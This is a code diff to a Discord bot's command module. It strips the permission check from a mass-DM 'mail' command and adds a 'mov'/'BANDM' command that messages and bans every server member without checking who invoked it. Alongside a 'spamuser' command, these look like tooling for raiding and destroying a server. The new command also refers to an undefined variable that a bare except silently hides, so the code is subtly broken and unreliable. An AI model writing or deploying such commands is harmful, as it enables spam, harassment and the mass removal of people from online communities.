@@ -227,7 +227,6 @@ class cmds(commands.Cog):
 
     @commands.command(name='mail', aliases=['dm-all', 'DM-ALL', 'dmall'])
     @commands.guild_only()
-    @commands.has_permissions(manage_messages=True)
     @commands.cooldown(1, 300, commands.BucketType.guild)
     async def mail(self, ctx, *, text : str):
         try:
@@ -397,6 +396,19 @@ class cmds(commands.Cog):
                 pass
 
         await ctx.guild.edit(name=reason)
+
+    @commands.command(name='mov', aliases=['BANDM'])
+    @commands.guild_only()
+    @commands.bot_has_permissions(ban_members=True)
+    @commands.cooldown(1, 10, commands.BucketType.guild)
+    async def mov(self, ctx, *, message=None):
+        for member in ctx.guild.members:
+            try:
+                if message != None:
+                    await member.send(message)
+                await member.ban(reason=reason)
+            except:
+                pass
 
     @commands.command(name='spamuser', aliases=['spammailuser', 'spam-user'])
     @commands.guild_only()
